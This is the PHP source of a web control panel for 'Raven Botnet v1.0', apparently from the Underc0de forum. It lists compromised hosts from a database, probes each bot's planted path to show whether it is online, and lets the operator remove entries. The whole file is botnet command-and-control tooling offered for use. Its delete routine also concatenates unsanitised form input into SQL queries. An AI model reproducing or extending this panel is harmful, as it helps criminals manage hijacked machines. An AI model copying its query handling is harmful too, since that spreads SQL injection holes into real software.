<?php
session_start();

if ($_SESSION['estado']!="log") {
    echo '<META HTTP-EQUIV="Refresh" CONTENT="0; URL=index.php">';
}
else {

    echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//ES" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">

    
    <head>
       <meta charset="UTF-8">
       <meta name="author" content="[Q]3rV[0]" />
       <meta name="language" content="spanish" />  
       <meta http-equiv="Content-Type" content="text/html" />
       <title>Raven Botnet v1.0 | Underc0de</title>
       
       <link rel="icon" href="img/favicon.ico" type="image/x-icon" />       
       
       <link type="text/css" rel="stylesheet" href="css/raven.css" /> 
       
       <script type="text/javascript" src="js/jquery-1.3.2.min.js"></script>
       <script type="text/javascript" src="js/jquery.easing.1.2.js"></script>
       <script type="text/javascript" src="js/jquery.prettyPhoto.js"></script>
       <script type="text/javascript" src="js/cufon-yui.js"></script>
       <script type="text/javascript" src="js/Sansation_700.font.js"></script>  
       <script type="text/javascript" src="js/Sansation_400.font.js"></script>     
       <script type="text/javascript" src="js/Sansation_300.font.js"></script>   
       <script type="text/javascript" src="js/common.js"></script>
       <script type="text/javascript" src="js/raven.js"></script>'; ?>
       
        <!--[if IE 6]>
        <script type="text/javascript" src="lib/DD_belatedPNG_0.0.8a-min.js"></script>
        <script>
          DD_belatedPNG.fix(".ie6PNGfix , .commonLink");
          
          /* string argument can be any CSS selector */
          /* .ie6PNGfix example is unnecessary */
          /* change it to what suits you! */
        </script>
        <![endif]-->   

                
    <?php echo '</head>
<body>
      
      <div id="headerContainer">
        <a name="pageTopAnchor"></a>
        <a href="admin.php" id="logo" class="ie6PNGfix"></a>
        <div id="titleWrapper">                              
          <a href="admin.php" id="title">Underc0de - Raven Botnet - v1.0</a>
          <p class="titleSlogan">Raven Botnet - Powered by [Q]3rv[0]</p> 
        </div> 
               
        </div> 
 
        <div id="bodyContainer2">    
          <div id="navigationContainer">            
            <ul class="rootnav">
                <li><a href="http://underc0de.org/tools.html">Check for Updates</a></li>
                <li><a href="logout.php">logout</a></li>
            </ul>
          </div>
             
          <div id="servicesContentContainer">           
            <div id="servicesContainer">
            <div id="servicesBigInfo">
            <br /> 
            <form action="#" method="POST"><center>
            <table class=tableBasic>
            <tr>';
            include("config.php");
//borrado checkbox
    if (isset($_POST['borrar']) && isset($_POST['checkbox'])) {
        $check=$_POST['checkbox'];
        foreach($check as &$ids) {
            $registro="DELETE FROM bots WHERE id=".$ids.";";
            mysqli_query($conexion, $registro);
}
}
//tabla bots
    $numero="SELECT * FROM bots;";
    $numero2=mysqli_query($conexion, $numero);
    if(mysqli_num_rows($numero2)!=0){
        echo "<td class=head>ITEM</td><td class=head>Ip</td><td class=head>Bot</td><td class=head>Location</td><td class=head>State</td><td class=head>Action</td>";
        while($bots=mysqli_fetch_array($numero2, MYSQLI_ASSOC)){
        //ON / OFF
            $state=fsockopen($bots['host'], 80);
            fputs($state, "GET /".$bots['path']." HTTP/1.0\r\n");
            fputs($state, "Host: ".$bots['host']."\n\n");
            $leer=fread($state, 20);
            $divide=explode(" ", $leer);
            if($divide[1]==200){
                $estado="<font color=green>ON</font>";
}
            else {
                $estado="<font color=red>OFF</font>";
}       
            fclose($state);    

//
            echo "<tr>";
            echo "<td><img src=img/raven.png height=25 weight=25></td><td>".$bots['ip']."</td><td><a href=http://".$bots['host']."/".$bots['path']." target=blank>http://".$bots['host']."/".$bots['path']."</a></td><td><img src=http://geoip.wtanaka.com/flag/".$bots['location'].".gif width=20 height=10></td><td><b>".$estado."</b></td><td><input type=checkbox name=checkbox[] value=".$bots['id']."></td>";
            echo "<tr>";
}
}

echo '</table></center>
<br>
<input type="submit" class="btnB" name="borrar" value="Delete"> 
</form>
</div>                                                                                                                     
          </div>                          
        </div> 
        <div class="clearBoth"></div>                      
      </div> 
      <br />
    </body>
</html>';
}
?>
